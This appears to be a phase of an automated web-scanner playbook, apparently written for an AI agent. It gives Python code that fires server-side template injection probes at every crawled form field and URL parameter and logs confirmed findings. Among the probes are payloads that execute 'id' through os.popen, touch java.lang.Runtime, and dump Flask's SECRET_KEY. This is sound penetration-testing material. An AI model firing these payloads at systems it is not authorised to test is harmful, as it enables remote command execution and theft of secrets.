**Phase 11 — SSTI (Server-Side Template Injection)**

  Test ALL text inputs for template injection. Run as ONE complete block.

  IMPORTANT — BASELINE COMPARISON REQUIRED:
    "49" or other short numbers appear naturally in HTML (CSS, dates, IDs, etc.).
    You MUST compare against a BASELINE (the page without the payload) to avoid false positives.
    Use LARGE unique numbers that cannot appear by coincidence.

  ```python
  import time, re
  from urllib.parse import urljoin

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')
  AUTH_FORMS = _G.get('AUTH_FORMS', [])
  ALL_FORMS  = _G.get('ALL_FORMS', [])
  all_forms  = AUTH_FORMS + ALL_FORMS

  # Use large unique numbers that CANNOT appear naturally in HTML
  SSTI_PROBES = [
      # Basic arithmetic probes (large unique numbers)
      {'payload': '{{91371*97331}}',   'expect': '8893559001',  'engine': 'Jinja2/Twig'},
      {'payload': '${91371*97331}',    'expect': '8893559001',  'engine': 'FreeMarker/Mako'},
      {'payload': '#{91371*97331}',    'expect': '8893559001',  'engine': 'Ruby ERB/Java EL'},
      {'payload': '<%= 91371*97331 %>', 'expect': '8893559001', 'engine': 'ERB/EJS'},
      # Jinja2-specific (Flask render_template_string) — CRITICAL for Flask apps
      {'payload': '{{config}}',        'expect': 'SECRET_KEY',  'engine': 'Jinja2-config'},
      {'payload': '{{config.items()}}', 'expect': 'SECRET_KEY', 'engine': 'Jinja2-config'},
      {'payload': '{{self.__class__}}', 'expect': 'TemplateReference', 'engine': 'Jinja2-class'},
      {'payload': '{{7*7}}',           'expect': '49',          'engine': 'Jinja2-simple'},
      {'payload': "{{''.__class__.__mro__}}", 'expect': 'str', 'engine': 'Jinja2-mro'},
      # Spring EL
      {'payload': '${T(java.lang.Runtime).getRuntime()}', 'expect': 'java.lang.Runtime', 'engine': 'Spring EL'},
      # Tornado
      {'payload': '{% import os %}{{os.popen("id").read()}}', 'expect': 'uid=', 'engine': 'Tornado'},
  ]

  AUTH_PARAMS = _G.get('AUTH_PARAMS', [])

  ssti_findings = []
  print(f"[SSTI] Testing {len(all_forms)} forms + {len(AUTH_PARAMS)} URL params")

  def ssti_test(url, param, method, fields=None):
      # Test a single param for SSTI with baseline comparison.
      # Step 1: Get baseline — what does the page return with a harmless value?
      try:
          if method == 'post' and fields is not None:
              base_data = {f['name']: f.get('value', 'test') or 'test' for f in fields}
              base_data[param] = 'ssti_safe_probe_12345'
              r_base = session.post(url, data=base_data, timeout=10, allow_redirects=True)
          else:
              r_base = session.get(url, params={param: 'ssti_safe_probe_12345'}, timeout=10)
      except Exception:
          return
      baseline = r_base.text

      # Step 2: Test each probe
      for probe in SSTI_PROBES:
          time.sleep(0.3)
          try:
              if method == 'post' and fields is not None:
                  data = {f['name']: f.get('value', 'test') or 'test' for f in fields}
                  data[param] = probe['payload']
                  r = session.post(url, data=data, timeout=10, allow_redirects=True)
              else:
                  r = session.get(url, params={param: probe['payload']}, timeout=10)
          except Exception:
              continue
          # CRITICAL CHECK: result must appear in response BUT NOT in baseline
          # For short expect values (like '49'), also check that our PAYLOAD is NOT in the response
          # (if payload is reflected literally as text, template was NOT evaluated)
          if probe['expect'] in r.text and probe['expect'] not in baseline:
              # Extra check: make sure the raw payload isn't just reflected back
              if probe['payload'] in r.text:
                  # Payload reflected literally — check if expect value also appears OUTSIDE the payload
                  stripped = r.text.replace(probe['payload'], '')
                  if probe['expect'] not in stripped:
                      continue  # false positive — payload reflected, not evaluated
              print(f"[CRITICAL] SSTI CONFIRMED: {url} param={param}")
              print(f"  Engine: {probe['engine']}  Payload: {probe['payload']}")
              print(f"  Response contains '{probe['expect']}' (evaluated — NOT in baseline)")
              idx = r.text.find(probe['expect'])
              print(f"  Context: ...{r.text[max(0,idx-60):idx+60]}...")
              ssti_findings.append({'url': url, 'param': param, 'engine': probe['engine'],
                                    'payload': probe['payload'], 'method': method.upper()})
              return True  # confirmed
      return False

  # Test ALL forms — every text field on every form
  for form in all_forms:
      action = form.get('action', BASE)
      method = form.get('method', 'get').lower()
      fields = form.get('fields', [])
      url = action if action.startswith('http') else urljoin(BASE, action)
      text_fields = [f for f in fields if f.get('type', 'text') not in ('submit','hidden','checkbox','radio','file','button')]
      if not text_fields:
          continue
      print(f"  Testing: {method.upper()} {url}  fields={[f['name'] for f in text_fields]}")
      for field in text_fields:
          ssti_test(url, field['name'], method, fields)

  # Test URL params — only params actually found in crawled URLs
  for param_info in AUTH_PARAMS:
      purl = param_info['url'].split('?')[0]
      pname = param_info['param']
      ssti_test(purl, pname, 'get')

  if ssti_findings:
      _G.setdefault('FINDINGS', [])
      for sf in ssti_findings:
          _G['FINDINGS'].append({
              'severity': 'CRITICAL',
              'title': 'Template Injection',
              'url': sf['url'],
              'method': sf['method'],
              'param': sf['param'],
              'payload': sf['payload'],
              'evidence': f"Engine: {sf['engine']} — response contains evaluated template output (not in baseline)",
              'impact': 'Full server-side template injection allows remote code execution, file read, and complete server compromise.',
              'remediation': 'Never pass user input into template render functions. Use sandboxed template engines and strict input validation.',
              'screenshot': ''
          })
      print(f"\n[CRITICAL] SSTI found on {len(ssti_findings)} parameter(s)!")
  else:
      print("[INFO] No SSTI detected")
  ```

AFTER RUNNING THIS BLOCK — MANDATORY:
1. For each confirmed SSTI finding, take a browser screenshot:
   browser_action(action="navigate", url="<vulnerable_url_with_payload>")
   browser_action(action="screenshot", filename="ssti_proof_<param>.png")
2. Update each finding's 'screenshot' field in _G['FINDINGS']
3. If the screenshot shows the template expression not evaluated → REMOVE the finding (false positive)
